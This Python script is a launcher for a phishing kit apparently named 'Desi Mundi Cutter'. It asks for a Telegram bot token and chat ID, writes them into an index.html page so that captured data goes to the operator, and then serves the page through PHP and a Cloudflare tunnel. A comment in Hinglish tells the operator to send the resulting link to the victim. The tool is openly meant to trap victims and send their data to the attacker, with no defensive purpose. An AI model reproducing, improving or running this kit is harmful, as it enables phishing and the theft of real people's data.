import os, time, sys

def banner():
    os.system('clear')
    print("\033[1;32m")
    print("  __  __ _  __  _   _    _    ____ _  _______ ____  ")
    print(" |  \/  | |/ / | | | |  / \  / ___| |/ / ____|  _ \ ")
    print(" | |\/| | ' /  | |_| | / _ \| |   | ' /|  _| | |_) |")
    print(" | |  | | . \  |  _  |/ ___ \ |___| . \| |___|  _ < ")
    print(" |_|  |_|_|\_\ |_| |_/_/   \_\____|_|\_\_____|_| \_\\")
    print("\033[1;37m       [+] MK-HACKER - DESI MUNDI CUTTER [+] \033[0m")
    print("\033[1;33m       [+] AUTHOR: MUNISH KUMAR (MK) [+] \033[0m\n")

banner()
# यूजर से जानकारी लें
token = input("\033[1;34m[*] Enter Telegram Bot Token: \033[0m")
chatid = input("\033[1;34m[*] Enter Telegram Chat ID: \033[0m")

print("\n\033[1;31m[!] Configuring files... Please wait.\033[0m")
time.sleep(2)

# index.html को ऑटो-अपडेट करना
try:
    with open('index.html', 'r') as f:
        data = f.read()
    
    new_data = data.replace('YOUR_BOT_TOKEN', token).replace('YOUR_CHAT_ID', chatid)
    
    with open('index.html', 'w') as f:
        f.write(new_data)
    print("\033[1;32m[✓] All Files Configured Successfully!\033[0m")
except:
    print("\033[1;31m[X] Error: index.html not found!\033[0m")
    sys.exit()

print("\n[1] Cloudflare (Public Link - High Quality)")
print("[2] Localhost (Only for Wifi)")
choice = input("\n[?] Choose Port Forwarding: ")

if choice == '1':
    banner()
    print("\033[1;32m[+] Starting PHP Server...\033[0m")
    os.system("php -S localhost:8080 > /dev/null 2>&1 &")
    time.sleep(2)
    print("\033[1;32m[+] Launching Cloudflare Tunnel...\033[0m")
    print("\033[1;31m[!] Link niche dikhega, use victim ko bheje!\n\033[0m")
    os.system("cloudflared tunnel --url http://localhost:8080")
else:
    os.system("php -S localhost:8080")
